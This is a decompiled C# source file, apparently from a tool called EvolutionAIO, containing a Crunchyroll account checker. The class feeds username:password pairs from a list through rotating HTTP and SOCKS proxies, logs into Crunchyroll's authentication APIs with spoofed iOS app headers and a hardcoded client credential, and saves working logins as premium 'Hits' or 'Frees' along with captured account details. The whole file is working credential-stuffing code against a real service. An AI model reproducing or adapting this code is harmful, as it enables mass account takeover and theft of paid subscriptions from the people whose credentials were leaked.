// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Crunchyroll
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;

namespace EvolutionAIO.Checkers
{
  internal class Crunchyroll
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            string str1 = Menu.UUIDGen();
            string str2 = Menu.UUIDGen();
            httpRequest.AddHeader("Host", "beta-api.crunchyroll.com");
            httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=utf-8");
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.AddHeader("Connection", "keep-alive");
            httpRequest.AddHeader("ETP-Anonymous-ID", str2);
            httpRequest.AddHeader("User-Agent", "Crunchyroll/4.1.0 (bundle_identifier:com.crunchyroll.iphone; build_number:1660985.483065922) iOS/13.3.1 Gravity/3.0.0");
            httpRequest.AddHeader("Accept-Language", "en-US;q=1.0");
            httpRequest.AddHeader("Authorization", "Basic Y3JfaW9zOmI4MjQzZDQwLWFmYmEtNDkxYi05NzMxLTZmMTdlMTcyMTk3Mw==");
            httpRequest.AddHeader("Accept-Encoding", "gzip;q=1.0, compress;q=0.5");
            string str3 = "grant_type=password&password=" + s[1] + "&scope=offline_access&username=" + s[0];
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            HttpResponse httpResponse = httpRequest.Post("https://beta-api.crunchyroll.com/auth/v1/token", str3, "application/x-www-form-urlencoded");
            if (httpResponse.ToString().Contains("access_token"))
            {
              string str4 = Regex.Match(httpResponse.ToString(), "\"country\":\"(.*)\"").Groups[1].Value;
              string str5 = Regex.Match(httpResponse.ToString(), "access_token\":\"(.*)\",\"r").Groups[1].Value;
              httpRequest.ClearAllHeaders();
              httpRequest.AddHeader("Host", "beta-api.crunchyroll.com");
              httpRequest.AddHeader("Connection", "keep-alive");
              httpRequest.AddHeader("Accept", "*/*");
              httpRequest.AddHeader("User-Agent", "Crunchyroll/4.0.3 (bundle_identifier:com.crunchyroll.iphone; build_number:1630932.519641451) iOS/13.3.1 Gravity/3.0.2");
              httpRequest.AddHeader("Accept-Language", "en-US;q=1.0");
              httpRequest.AddHeader("Authorization", "Bearer " + str5);
              string str6 = Regex.Match(httpRequest.Get("https://beta-api.crunchyroll.com/accounts/v1/me").ToString(), "email_verified\":(.*),\"").Groups[1].Value;
              httpRequest.ClearAllHeaders();
              httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
              httpRequest.AddHeader("Pragma", "no-cache");
              httpRequest.AddHeader("Accept", "*/*");
              string str7 = "device_type=com.crunchyroll.windows.desktop&device_id=" + str1 + "&access_token=LNDJgOit5yaRIWN";
              string str8 = Regex.Match(httpRequest.Post("https://api.crunchyroll.com/start_session.0.json", str7, "application/x-www-form-urlencoded").ToString(), "\"session_id\":\"(.*)\",\"c").Groups[1].Value;
              string str9 = "account=" + s[0] + "&password=" + s[1] + "&session_id=" + str8 + "&locale=enUS&version=1.3.1.0&connectivity_type=ethernet";
              string input = httpRequest.Post("https://api.crunchyroll.com/login.0.json", str9, "application/x-www-form-urlencoded").ToString();
              string str10 = Regex.Match(input, "\"username\":\"(.*)\",\"email").Groups[1].Value;
              string[] strArray1 = Regex.Match(input, "\"expires\":\"(.*)\"},\"e").Groups[1].Value.Split('T');
              string str11 = Regex.Match(input, "\"is_publisher\":(.*),\"ac").Groups[1].Value;
              string[] strArray2 = Regex.Match(input, "\"premium\":\"(.*)\",\"i").Groups[1].Value.Split('|');
              List<string> stringList = new List<string>();
              foreach (string str12 in strArray2)
                stringList.Add(str12);
              string str13 = s[0] + ":" + s[0] + " | Username: " + str10 + " ~ Expires: " + strArray1[0] + " ~ Is Publisher: " + str11;
              if (input.Contains("\"access_type\":\"premium\""))
              {
                if (Menu.p1 == "2")
                  Colorful.Console.WriteLine(" [+] " + s[0] + ":" + s[1] + " | Premium ~ " + str13, Color.Green);
                ++Menu.hits;
                Save.AsResult(nameof (Crunchyroll), "Capture", s[0] + ":" + s[1] + str13);
                Save.AsResult(nameof (Crunchyroll), "Hits", s[0] + ":" + s[1]);
              }
              else if (input.Contains("\"premium\":\"\""))
              {
                if (Menu.p1 == "2")
                  Colorful.Console.Write(" [/] " + s[0] + ":" + s[1] + " | Free\n", Color.Yellow);
                ++Menu.frees;
                Save.AsResult(nameof (Crunchyroll), "Frees", s[0] + ":" + s[1] + " | FREE");
              }
              else if (input.Contains("{\"data\":{\"user\":{\"class\":\"user\",\"user_id\":\""))
              {
                if (Menu.p1 == "2")
                  Colorful.Console.WriteLine(" [+] " + s[0] + ":" + s[1] + str13, Color.Green);
                ++Menu.hits;
                Save.AsResult(nameof (Crunchyroll), "Capture", s[0] + ":" + s[1] + str13);
                Save.AsResult(nameof (Crunchyroll), "Hits", s[0] + ":" + s[1]);
              }
              else
              {
                input.Contains("Incorrect login information");
                return false;
              }
              return false;
            }
            if (httpResponse.ToString().Contains("auth.obtain_access_token.invalid_credentials"))
              return false;
            httpResponse.ToString().Contains("auth.obtain_access_token.force_password_reset");
            return false;
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("403") || ex.ToString().Contains("Index was outside the bounds of the array") || ex.ToString().Contains("401"))
            return false;
          if (ex.ToString().Contains("429"))
            ++Menu.retries;
          else
            ++Menu.errors;
        }
      }
    }
  }
}
